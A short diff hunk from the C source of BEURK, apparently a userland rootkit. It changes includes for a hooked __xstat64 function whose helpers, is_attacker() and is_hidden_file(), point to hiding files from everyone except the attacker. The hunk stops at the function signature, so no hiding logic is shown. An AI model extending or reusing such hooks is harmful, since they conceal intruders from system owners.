@@ -18,10 +18,11 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include <sys/stat.h> /* struct stat */
+#include <sys/stat.h> /* struct stat64 */
 #include <errno.h> /* errno, ENOENT */
 #include "beurk.h" /* is_attacker(), is_hidden_file() */
-#include "config.h" /* REAL_STAT() */
+#include "config.h" /* REAL___XSTAT64() */
+#include "debug.h" /* DEBUG() */
 #include "hooks.h" /* prototype */
 
 int __xstat64(int ver, const char *__restrict __file, struct stat64 *buf) {
